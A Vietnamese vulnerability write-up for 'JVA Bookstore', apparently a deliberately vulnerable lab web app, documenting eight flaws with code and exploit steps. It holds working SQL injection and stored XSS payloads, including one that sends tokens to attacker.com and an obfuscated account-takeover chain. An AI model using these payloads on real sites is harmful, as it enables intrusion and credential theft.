# Tổng Hợp Lỗ Hổng Theo Danh Sách Yêu Cầu — JVA Bookstore

## Mục lục

| # | Lỗ hổng | Loại | Mức độ |
|---|---------|------|--------|
| 1 | [SQLi — Đăng nhập (Authentication Bypass)](#1-sql-injection--đăng-nhập-authentication-bypass) | SQL Injection | Nghiêm trọng |
| 2 | [SQLi — Đổi mật khẩu (Bypass currentPassword)](#2-sql-injection--đổi-mật-khẩu-bypass-currentpassword) | SQL Injection | Nghiêm trọng |
| 3 | [Stored XSS — Đánh giá sách](#3-stored-xss--đánh-giá-sách) | XSS | Nghiêm trọng |
| 4 | [CSRF — Kết hợp Stored XSS + SQLi chiếm tài khoản](#4-csrf--kết-hợp-stored-xss--sqli-chiếm-tài-khoản) | CSRF | Nghiêm trọng |
| 5 | [IDOR — Xem profile user bất kỳ](#5-idor--xem-profile-user-bất-kỳ) | Broken Access Control | Cao |
| 6 | [Broken Access Control — User thường truy cập/chỉnh sửa API admin](#6-broken-access-control--user-thường-truy-cậpchỉnh-sửa-api-admin) | Broken Access Control | Nghiêm trọng |
| 7 | [Hardcoded Admin Secret — Chiếm quyền admin support chat](#7-hardcoded-admin-secret--chiếm-quyền-admin-support-chat) | Broken Authentication / Sensitive Secret Exposure | Nghiêm trọng |
| 8 | [BOLA / IDOR nhẹ — Xem coupon active của shop khác qua shopId](#8-bola--idor-nhẹ--xem-coupon-active-của-shop-khác-qua-shopid) | Broken Access Control | Trung bình |

---

## 1. SQL Injection — Đăng nhập (Authentication Bypass)

### Thông tin lỗ hổng

- **Loại:** SQL Injection + Authentication Bypass
- **File:** `src/main/java/web/AuthServlet.java` — dòng 114
- **Endpoint:** `POST /api/login`

### Code lỗi

```java
// Dòng 114: String concatenation
String sql = "SELECT id, username, email, password_hash, role, status " +
             "FROM users WHERE username = '" + username + "'";

// Dòng 148-155: Nếu password_hash rỗng → bỏ qua kiểm tra BCrypt
if (dbHash != null && !dbHash.trim().isEmpty()) {
    if (!BCrypt.checkpw(password, dbHash)) {
        // Từ chối
    }
}
```

**Nguyên nhân:**
1. `username` ghép trực tiếp vào SQL → attacker chèn UNION SELECT
2. Nếu `password_hash` trả về rỗng (`''`) → code bỏ qua bước kiểm tra mật khẩu

### Cách tấn công chi tiết

**Bước 1:** Mở trình duyệt, truy cập `https://localhost:8443/login.jsp`

**Bước 2:** Tại ô "Tên đăng nhập" (username), nhập payload:

```
' UNION SELECT 1, 'admin', 'admin@test.com', '', 'admin', 'active' --
```

**Bước 3:** Tại ô "Mật khẩu" (password), nhập bất kỳ, ví dụ: `abc`

**Bước 4:** Nhấn nút "Đăng nhập"

**Kết quả:** Đăng nhập thành công với **quyền admin**, được redirect đến `/admin-dashboard`.

**Giải thích từng bước:**

1. Câu SQL gốc: `SELECT ... FROM users WHERE username = '<input>'`
2. Sau khi ghép payload:
```sql
SELECT id, username, email, password_hash, role, status
FROM users WHERE username = ''
UNION SELECT 1, 'admin', 'admin@test.com', '', 'admin', 'active' --'
```
3. Query gốc trả về 0 row (không có user tên `''`)
4. UNION SELECT trả về 1 row giả:
   - `id = 1`
   - `username = 'admin'`
   - `email = 'admin@test.com'`
   - `password_hash = ''` (rỗng!)
   - `role = 'admin'`
   - `status = 'active'`
5. Code kiểm tra: `dbHash = ''` → `dbHash.trim().isEmpty() = true` → **bỏ qua kiểm tra mật khẩu**
6. Login thành công với role `admin`

### Mở rộng — Login với role khác

Thay `'admin'` bằng `'seller'` để login quyền seller:
```
' UNION SELECT 1, 'seller', 'seller@test.com', '', 'seller', 'active' --
```

---

## 2. SQL Injection — Đổi mật khẩu (Bypass currentPassword)

### Thông tin lỗ hổng

- **Loại:** SQL Injection + Authentication Bypass
- **File:** `src/main/java/web/ProfileServlet.java` — dòng 600-608
- **Endpoint:** `POST /api/profile/password` hoặc `PUT /api/profile/password`

### Code lỗi

```java
// Dòng 586-598: Kiểm tra BCrypt trước (cho user bình thường)
boolean passwordVerified = false;
String selectSql = "SELECT password_hash FROM users WHERE email = ?";
// ... BCrypt.checkpw(currentPassword, storedHash) ...

// Dòng 600-608: Fallback — legacy SQL query (LỖ HỔNG!)
if (!passwordVerified) {
    String legacySql = "SELECT id FROM users WHERE email = '" + email
                     + "' AND password_hash = '" + currentPassword + "'";
    try (java.sql.Statement stmt = conn.createStatement();
         ResultSet rs = stmt.executeQuery(legacySql)) {
        if (rs.next()) {
            passwordVerified = true;
        }
    }
}
```

**Nguyên nhân:**
1. Kiểm tra mật khẩu bằng BCrypt trước → nếu fail (vì payload SQLi không phải mật khẩu thật)
2. Fallback sang legacy SQL dùng string concatenation → `currentPassword` ghép trực tiếp vào SQL
3. Attacker chèn `' OR '1'='1'--` vào `currentPassword` → điều kiện luôn đúng → bypass

**Lưu ý quan trọng:** User bình thường nhập đúng mật khẩu cũ → BCrypt verify thành công ở bước 1 → đổi mật khẩu bình thường, KHÔNG chạy vào legacy SQL.

### Cách tấn công chi tiết

**Bước 1:** Đăng nhập vào tài khoản (bất kỳ tài khoản nào)

**Bước 2:** Vào trang "Đổi mật khẩu" trên giao diện

**Bước 3:** Điền form:
- **Mật khẩu hiện tại:** `' OR '1'='1'--`
- **Mật khẩu mới:** `hacked123`
- **Xác nhận mật khẩu:** `hacked123`

**Bước 4:** Nhấn "Đổi mật khẩu"

**Kết quả:** Mật khẩu được đổi thành `hacked123` mà **không cần biết mật khẩu cũ**.

**Giải thích:** Câu legacy SQL sau khi ghép:
```sql
SELECT id FROM users WHERE email = 'victim@email.com' AND password_hash = '' OR '1'='1'--'
```
- `password_hash = ''` → false
- `OR '1'='1'` → true
- `--` → comment phần còn lại
- **Kết quả: trả về row** → `passwordVerified = true` → cho phép đổi mật khẩu

### Hoặc dùng API trực tiếp (DevTools Console)

```javascript
fetch('/api/profile/password', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json',
        'Authorization': 'Bearer ' + localStorage.getItem('auth_token')
    },
    body: JSON.stringify({
        currentPassword: "' OR '1'='1'--",
        newPassword: 'hacked123',
        confirmPassword: 'hacked123'
    })
}).then(r => r.json()).then(console.log);
```

---

## 3. Stored XSS — Đánh giá sách

### Thông tin lỗ hổng

- **Loại:** Stored XSS (Cross-Site Scripting)
- **File:** `src/main/webapp/book-detail.jsp` — dòng 265
- **Trang bị ảnh hưởng:** Trang chi tiết sách (`/book-detail.jsp?id=<bookId>`)

### Code lỗi

```jsp
<p class="text-gray-700 leading-relaxed whitespace-pre-line break-words">
    ${r.comment}    <%-- EL expression KHÔNG escape HTML! --%>
</p>
```

**Nguyên nhân:**
- Dùng `${r.comment}` (EL expression) để render nội dung đánh giá
- EL expression **không tự động escape HTML** → thẻ HTML/JavaScript trong comment được render trực tiếp
- Đáng lẽ phải dùng `<c:out value="${r.comment}"/>` (tự escape `<`, `>`, `"`, `&`)
- Backend (`ReviewDAO.upsertReview()`) lưu content trực tiếp vào database mà không sanitize

### Điều kiện tiên quyết

- Attacker phải có tài khoản trên hệ thống
- Attacker phải đã mua ít nhất 1 cuốn sách (để có quyền viết đánh giá)

### Cách tấn công chi tiết

**Bước 1:** Đăng nhập bằng tài khoản attacker

**Bước 2:** Mua 1 cuốn sách bất kỳ (ví dụ sách có id=1), hoàn tất đơn hàng

**Bước 3:** Vào trang chi tiết cuốn sách vừa mua: `https://localhost:8443/book-detail.jsp?id=1`

**Bước 4:** Kéo xuống phần "Viết đánh giá", chọn số sao và nhập nội dung:

```
Cuốn sách này thật sự rất hay và bổ ích, mình đã đọc xong trong 2 ngày. Rất recommend cho mọi người! <img src=x onerror="alert('XSS - Cookie: ' + document.cookie)">
```

> Phần text đầu cần dài hơn 50 ký tự để pass validation.

**Bước 5:** Nhấn "Gửi đánh giá" → Review được lưu vào database

**Bước 6:** Bất kỳ user nào (kể cả admin) vào xem trang chi tiết cuốn sách đó:
- Trang load danh sách đánh giá → `${r.comment}` render trực tiếp HTML
- Thẻ `<img src=x>` được render → trình duyệt load ảnh → lỗi (vì `src=x` không tồn tại) → sự kiện `onerror` kích hoạt
- **JavaScript chạy:** `alert('XSS - Cookie: ' + document.cookie)`
- Popup hiện ra → chứng minh XSS thành công

### Payload thực tế — Đánh cắp token

Thay vì `alert()`, attacker dùng payload thực tế:

```
Cuốn sách này thật sự rất hay và bổ ích, mình đã đọc xong trong 2 ngày. Rất recommend cho mọi người! <img src=x onerror="new Image().src='https://attacker.com/steal?token='+localStorage.getItem('auth_token')+'&cookie='+document.cookie">
```

→ Token JWT và cookie nạn nhân bị gửi về server attacker.

## 4. CSRF — Kết hợp Stored XSS + SQLi chiếm tài khoản

### Thông tin lỗ hổng

- **Loại:** CSRF (Cross-Site Request Forgery), kết hợp Stored XSS + SQLi
- **File:** Kết hợp lỗ hổng #2 (SQLi đổi mật khẩu) + #3 (Stored XSS)
- **Endpoint bị tấn công:** `POST /api/profile/password`

### Nguyên nhân

1. Server không kiểm tra CSRF token trên endpoint đổi mật khẩu
2. Cookie `auth_token` được set với `SameSite=None` → trình duyệt gửi cookie trong cross-origin request
3. Stored XSS cho phép chạy JavaScript từ cùng origin → bypass mọi hạn chế CORS/SameSite
4. SQLi trong `currentPassword` cho phép bypass kiểm tra mật khẩu cũ

### Cách tấn công chi tiết

#### Giai đoạn 1: Attacker chuẩn bị (cài bẫy)

**Bước 1:** Attacker đăng nhập bằng tài khoản của mình

**Bước 2:** Mua 1 cuốn sách bất kỳ (để có quyền viết đánh giá)

**Bước 3:** Vào trang chi tiết sách đã mua, viết đánh giá với nội dung:

> ⚠️ **QUAN TRỌNG:** Copy chính xác payload bên dưới (bao gồm cả phần text trước thẻ `<img`). Phải copy từ **raw markdown** (nhấn nút Raw trên GitHub), KHÔNG copy từ trang đã render.

```
Cuốn sách này thật sự rất hay và bổ ích, mình đã đọc xong trong 2 ngày. Rất recommend cho mọi người! <img src=x onerror='var t=localStorage.getItem("auth_token");if(t){fetch("/api/profile/password",{method:"POST",headers:{"Content-Type":"application/json","Authorization":"Bearer "+t},body:atob("eyJjdXJyZW50UGFzc3dvcmQiOiInIE9SICcxJz0nMSctLSIsIm5ld1Bhc3N3b3JkIjoiaGFja2VkX2NzcmYiLCJjb25maXJtUGFzc3dvcmQiOiJoYWNrZWRfY3NyZiJ9")})}'>
```

**Giải thích payload:**
- Phần text đầu: nội dung đánh giá bình thường (>50 ký tự để pass validation)
- `<img src=x>`: tạo thẻ img với src không hợp lệ → chắc chắn gây lỗi
- `onerror='...'`: dùng dấu nháy đơn `'` bao ngoài → bên trong thoải mái dùng dấu nháy kép `"`
- `atob("eyJ...")`: giải mã base64 → ra JSON body:
  ```json
  {"currentPassword":"' OR '1'='1'--","newPassword":"hacked_csrf","confirmPassword":"hacked_csrf"}
  ```
- Dùng base64 để tránh vấn đề dấu nháy khi copy-paste

**Bước 4:** Nhấn "Gửi đánh giá" → Payload XSS được lưu vào database

#### Giai đoạn 2: Nạn nhân bị tấn công (tự động)

**Bước 5:** Nạn nhân (bất kỳ user đang đăng nhập) truy cập trang chi tiết cuốn sách có review độc hại

**Bước 6:** Trang load đánh giá → `${r.comment}` render thẻ `<img>` → `onerror` kích hoạt → JavaScript chạy tự động:

1. `localStorage.getItem("auth_token")` → lấy JWT token nạn nhân (người đang xem)
2. `atob("eyJ...")` → giải mã base64 → JSON body chứa SQLi payload
3. `fetch("/api/profile/password", ...)` → gửi request đổi mật khẩu:
   - `currentPassword: "' OR '1'='1'--"` → SQLi bypass (lỗ hổng #2)
   - `newPassword: "hacked_csrf"`
   - `confirmPassword: "hacked_csrf"`
4. Server nhận request → BCrypt check fail → fallback legacy SQL → SQLi bypass → **mật khẩu nạn nhân bị đổi thành `hacked_csrf`**

**Bước 7:** Nạn nhân **không hay biết** — trang hiển thị bình thường, không popup, không redirect

#### Giai đoạn 3: Attacker chiếm tài khoản

**Bước 8:** Attacker login bằng email nạn nhân + mật khẩu `hacked_csrf`

**Bước 9:** Toàn quyền truy cập tài khoản nạn nhân: xem đơn hàng, đổi thông tin, mua hàng, v.v.

### Kiểm tra tấn công thành công

1. Mở DevTools (F12) → tab **Network**
2. Truy cập trang sách có review độc hại
3. Quan sát: thấy request `POST /api/profile/password` tự động gửi đi
4. Click vào request đó → tab **Response** → thấy: `{"success":true,"message":"Password changed successfully"}`
5. Logout → login lại bằng mật khẩu cũ → **Thất bại**
6. Login bằng mật khẩu `hacked_csrf` → **Thành công** → tài khoản bị chiếm

---

## 5. IDOR — Xem profile user bất kỳ

### Thông tin lỗ hổng

- **Loại:** IDOR (Insecure Direct Object Reference) — Broken Access Control
- **File:** `src/main/java/web/ProfileServlet.java` — dòng 312-365
- **Endpoint:** `GET /api/profile/user-info?userId=<id>`

### Code lỗi

```java
private void getAnyUserProfile(HttpServletRequest request, HttpServletResponse response)
        throws IOException {
    // KHÔNG kiểm tra quyền! Bất kỳ user đăng nhập nào cũng gọi được
    String userIdParam = request.getParameter("userId");
    long userId = Long.parseLong(userIdParam);

    String sql = "SELECT id, email, full_name, phone, birth_date, address, " +
                 "role, status, created_at FROM users WHERE id = ?";
    // Trả về toàn bộ thông tin user
}
```

**Nguyên nhân:**
- Endpoint nhận `userId` từ client mà **không kiểm tra** user hiện tại có quyền xem profile của user đó không
- `JwtFilter` còn allow public `GET /api/profile/user-info` nên endpoint này **thậm chí không bắt buộc đăng nhập**

### Vì sao attacker biết endpoint này tồn tại?

- Không nhất thiết phải thấy sẵn trong tab Network hoặc debugger của luồng UI
- Attacker có thể phát hiện qua source code server (`ProfileServlet`) hoặc đoán theo pattern API `/api/profile/...`
- Trong code hiện tại, `JwtFilter` còn whitelist trực tiếp path này ở nhánh public GET

### Cách tấn công chi tiết

**Bước 1:** Mở trực tiếp trình duyệt hoặc DevTools (F12) → Console

**Bước 2:** Chạy lệnh lấy thông tin user id=1:

```javascript
fetch('/api/profile/user-info?userId=1')
  .then(r => r.json())
  .then(data => console.log(data));
```

**Kết quả:**
```json
{
  "success": true,
  "user": {
    "id": 1,
    "email": "admin@bookstore.vn",
    "fullName": "Admin User",
    "phone": "0901234567",
    "address": "123 Nguyễn Huệ, Q1, TP.HCM",
    "role": "admin",
    "status": "active",
    "createdAt": "2024-01-01T00:00:00"
  }
}
```

**Bước 3:** Lặp lại với `userId=2`, `userId=3`, ... để thu thập thông tin **tất cả user**:

```javascript
// Quét 1000 user đầu tiên
for (let i = 1; i <= 1000; i++) {
    fetch('/api/profile/user-info?userId=' + i)
    .then(r => r.json())
    .then(data => {
        if (data.success) {
            console.log(`User ${i}: ${data.user.email} - ${data.user.fullName} - ${data.user.role}`);
        }
    });
}

hoặc vd: https://localhost:8443/api/profile/user-info?userId=199
```

**Thông tin bị lộ:** Email, SĐT, địa chỉ nhà, ngày sinh, role (admin/seller/customer), trạng thái tài khoản.

---

## 6. Broken Access Control — User thường truy cập/chỉnh sửa API admin

### Thông tin lỗ hổng
Search từ khóa "categories" trong debugger trong DevTool(F12) -> lấy đc url "/api/admin/categories"
của admin và tận dụng nó để tấn công.

- **Loại:** Broken Access Control / Missing Authorization
- **File 1:** `src/main/java/filters/JwtFilter.java` — dòng 121-138
- **File 2:** `src/main/java/web/admin/AdminDashboardServlet.java` — dòng 25-49
- **File 3:** `src/main/java/web/admin/AdminCategoriesServlet.java` — dòng 21-62
- **Endpoint tiêu biểu:**
  - `GET /api/admin/dashboard`
  - `GET /api/admin/categories?action=list`
  - `POST /api/admin/categories?action=create`
  - `POST /api/admin/categories?action=update`
  - `POST /api/admin/categories?action=delete`

### Code lỗi

```java
// JwtFilter.java
if (path.equals("/api/admin/categories") || path.equals("/api/admin/dashboard") || path.equals("/api/admin/promotions")) {
    return true;
}
```

```java
// JwtFilter.java
HttpSession session = req.getSession(false);
if (session != null && session.getAttribute("user_id") != null) {
    chain.doFilter(request, response);
    return;
}
```

```java
// AdminDashboardServlet.java
protected void doGet(HttpServletRequest req, HttpServletResponse resp) {
    JsonObject stats = getDashboardStats();
    JsonObject revenueData = getRevenueData();
    JsonObject topSellers = getTopSellers();
    // KHÔNG kiểm tra role admin
}
```

```java
// AdminCategoriesServlet.java
protected void doPost(HttpServletRequest req, HttpServletResponse resp) {
    if ("create".equals(action)) {
        createCategory(req, out);
    } else if ("update".equals(action)) {
        updateCategory(req, out);
    } else if ("delete".equals(action)) {
        deleteCategory(req, out);
    }
    // KHÔNG kiểm tra role admin
}
```

**Nguyên nhân:**
1. `JwtFilter` cho phép public một số endpoint admin ở nhánh `GET`
2. Với request không public, filter chỉ kiểm tra **đã đăng nhập** chứ không kiểm tra `role = admin`
3. Bản thân các servlet admin không tự xác thực role admin

### Cách tấn công chi tiết

#### Tấn công 1 — Xem dashboard admin bằng tài khoản thường

**Bước 1:** Đăng nhập bằng tài khoản customer bình thường

**Bước 2:** Mở DevTools (F12) → Console hoặc truy cập trực tiếp:

```
https://localhost:8443/api/admin/dashboard
```

**Bước 3:** Hoặc gọi bằng `fetch()`:

```javascript
fetch('/api/admin/dashboard')
  .then(r => r.json())
  .then(console.log);
```

**Kết quả:** Trả về dữ liệu quản trị như:
- `totalUsers`
- `totalProducts`
- `totalOrders`
- `totalRevenue`
- `topSellers`

→ User thường đọc được dữ liệu chỉ dành cho admin.

#### Tấn công 2 — Tạo category bằng tài khoản thường

**Bước 1:** Đăng nhập bằng tài khoản customer bình thường

**Bước 2:** Mở DevTools (F12) → Console

**Bước 3:** Gửi request tạo category:

```javascript
fetch('/api/admin/categories?action=create', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/x-www-form-urlencoded'
  },
  body: 'name=HackedCategory'
}).then(r => r.text()).then(console.log);
```

**Kết quả:** Nếu response trả về kiểu:

```json
{"message":"Category created successfully","id":123,...}
```

→ chứng minh user thường có thể thực hiện chức năng quản trị.

#### Tấn công 3 — Sửa hoặc xóa category

```javascript
fetch('/api/admin/categories?action=update', {
  method: 'POST',
  headers: {'Content-Type': 'application/x-www-form-urlencoded'},
  body: 'id=1&name=ChangedByCustomer'
}).then(r => r.text()).then(console.log);

fetch('/api/admin/categories?action=delete', {
  method: 'POST',
  headers: {'Content-Type': 'application/x-www-form-urlencoded'},
  body: 'id=1'
}).then(r => r.text()).then(console.log);
```

**Kết quả:** User thường có thể sửa/xóa dữ liệu quản trị nếu biết `id`.

**Mức độ ảnh hưởng:**
- Lộ dữ liệu quản trị nội bộ
- User thường thao tác được chức năng admin
- Có thể phá dữ liệu danh mục, ảnh hưởng toàn bộ hệ thống

---

## 7. Hardcoded Admin Secret — Chiếm quyền admin support chat

### Thông tin lỗ hổng

- **Loại:** Broken Authentication / Sensitive Secret Exposure
- **File 1:** `src/main/java/web/AdminSupportChatServlet.java` — dòng 195-227
- **File 2:** `src/main/webapp/assets/js/admin/AdSupportChat.js` — dòng 7-13
- **Endpoint:** `GET/POST /api/admin/support-chat`

### Code lỗi

```java
// AdminSupportChatServlet.java
private boolean isAuthorized(HttpServletRequest req, HttpServletResponse resp) throws IOException {
    if (isLocalhost(req)) {
        return true;
    }
    String expected = getAdminSecret();
    String paramSecret = trimToNull(req.getParameter("secret"));
    String headerSecret = trimToNull(req.getHeader("X-Admin-Secret"));
    if (expected.equals(paramSecret) || expected.equals(headerSecret)) {
        return true;
    }
    // ...
}

private String getAdminSecret() {
    String env = System.getenv("ADMIN_PANEL_SECRET");
    if (env != null && !env.trim().isEmpty()) {
        return env.trim();
    }
    return "dev-secret-key-change-me";
}
```

```javascript
// AdSupportChat.js
var ADMIN_SECRET = (function () {
    var params = new URLSearchParams(window.location.search);
    var fromQuery = params.get('secret');
    if (fromQuery && fromQuery.trim().length > 0) {
        return fromQuery.trim();
    }
    return 'dev-secret-key-change-me';
})();
```

**Nguyên nhân:**
1. Quyền truy cập admin support chat không gắn với session/role admin thật
2. Secret mặc định được hardcode trực tiếp trong backend
3. Secret còn bị lộ luôn ở frontend JavaScript
4. Ai biết secret đều có thể đọc toàn bộ conversation và trả lời như admin support

### Cách test chi tiết

#### Bước 1: Tạo một conversation để test
Bắt đc gói tin support-chat ghi nhấn Hỗ trợ trên acc client, từ đó vô Debugger tìm thử từ khóa "support-chat" và thấy đc đường dẫn "/api/admin/support-chat" của admin, và ta sẽ tận dụng nó để giả mạo làm admin,...

Đăng nhập bằng user thường, mở trang support và gửi 1 tin nhắn. Hoặc dùng Console:

```javascript
fetch('/api/support-chat', {
  method: 'POST',
  headers: {
    'Authorization': 'Bearer ' + localStorage.getItem('auth_token'),
    'Content-Type': 'application/json'
  },
  body: JSON.stringify({
    content: 'Test support chat from customer account'
  })
}).then(r => r.text()).then(console.log);
```

#### Bước 2: Lấy danh sách conversation với secret mặc định

```javascript
fetch('/api/admin/support-chat?action=conversations&secret=dev-secret-key-change-me')
  .then(r => r.text())
  .then(console.log);
```

**Kết quả mong đợi:** Response trả về danh sách `conversations`.

#### Bước 3: Đọc message của một conversation cụ thể

```javascript
fetch('/api/admin/support-chat?action=messages&conversationId=1&secret=dev-secret-key-change-me')
  .then(r => r.text())
  .then(console.log);
```

**Kết quả mong đợi:** Trả về nội dung chat giữa user và support.

#### Bước 4: Giả làm admin support để trả lời

```javascript
fetch('/api/admin/support-chat?secret=dev-secret-key-change-me', {
  method: 'POST',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({
    action: 'reply',
    conversationId: 1,
    content: 'Tin nhắn giả mạo từ admin support'
  })
}).then(r => r.text()).then(console.log);
```

**Kết quả mong đợi:** User quay lại trang support sẽ thấy tin nhắn mới từ phía support/admin.

**Mức độ ảnh hưởng:**
- Đọc toàn bộ hội thoại hỗ trợ
- Giả mạo admin/support để lừa user
- Rò rỉ secret nội bộ ra frontend

---

## 8. BOLA / IDOR nhẹ — Xem coupon active của shop khác qua shopId

### Thông tin lỗ hổng

- **Loại:** Broken Object Level Authorization (BOLA) / IDOR nhẹ
- **File 1:** `src/main/java/web/ProfileServlet.java` — dòng 959-977
- **File 2:** `src/main/java/dao/ShopCouponDAO.java` — dòng 68-79
- **Endpoint:** `GET /api/profile/shop-coupons?shopId=<id>`

### Code lỗi

```java
private void listShopCouponsForShop(HttpServletRequest request, HttpServletResponse response)
        throws IOException, SQLException {
    Long userId = getRequiredUserId(request, response, responseMap);
    // ...
    Long shopIdRaw = parseId(request.getParameter("shopId"));
    int shopId = shopIdRaw.intValue();
    List<ShopCoupon> coupons = ShopCouponDAO.listActiveForShop(shopId);
}
```

```java
public static List<ShopCoupon> listActiveForShop(int shopId) throws SQLException {
    String sql = "SELECT ... FROM shop_coupons ... WHERE sc.shop_id = ? AND sc.status = 'active' ...";
}
```

**Nguyên nhân:**
1. Endpoint nhận `shopId` trực tiếp từ client
2. Không kiểm tra user hiện tại có quyền xem coupon của shop đó hay không
3. Bất kỳ user đăng nhập nào cũng có thể đổi `shopId` để xem dữ liệu shop khác

### Cách test chi tiết

#### Bước 1: Đăng nhập bằng user thường

#### Bước 2: Gọi endpoint với `shopId` khác nhau

```javascript
fetch('/api/profile/shop-coupons?shopId=1', {
  headers: {
    'Authorization': 'Bearer ' + localStorage.getItem('auth_token')
  }
}).then(r => r.text()).then(console.log);
```

Sau đó đổi `shopId=2`, `3`, `4`...

**Kết quả mong đợi:** Response trả về coupon active của từng shop khác nhau dù user không thuộc shop đó.

**Thông tin bị lộ:**
- `code`
- `description`
- `discountType`
- `discountValue`
- `minimumOrder`
- `remaining`
- `startDate`, `endDate`
- `shopName`

**Mức độ ảnh hưởng:**
- Rò rỉ dữ liệu khuyến mãi giữa các shop
- Cho phép user enumerate coupon active theo `shopId`
- Yếu hơn `user-info`, nhưng vẫn là một object-level authorization issue rõ ràng

---

## Tóm tắt các lỗ hổng giữ lại

| # | Lỗ hổng | Loại | Endpoint | Payload chính |
|---|---------|------|----------|---------------|
| 1 | SQLi login bypass | SQLi | `POST /api/login` | `' UNION SELECT 1,'admin','a@b.c','','admin','active' --` |
| 2 | SQLi đổi pass | SQLi | `POST /api/profile/password` | currentPassword: `' OR '1'='1'--` |
| 3 | Stored XSS | XSS | Review sách | `<img src=x onerror="...">` |
| 4 | CSRF chain | CSRF+XSS+SQLi | Review sách → `/api/profile/password` | Stored XSS auto-submit |
| 5 | IDOR | Broken Access | `GET /api/profile/user-info?userId=` | `userId=1,2,3...` |
| 6 | Admin API access control | Broken Access | `/api/admin/dashboard`, `/api/admin/categories` | User thường gọi API admin trực tiếp |
| 7 | Admin support chat takeover | Secret Exposure + BAC | `/api/admin/support-chat` | `secret=dev-secret-key-change-me` |
| 8 | Shop coupon BOLA | Broken Access | `GET /api/profile/shop-coupons?shopId=` | `shopId=1,2,3...` |
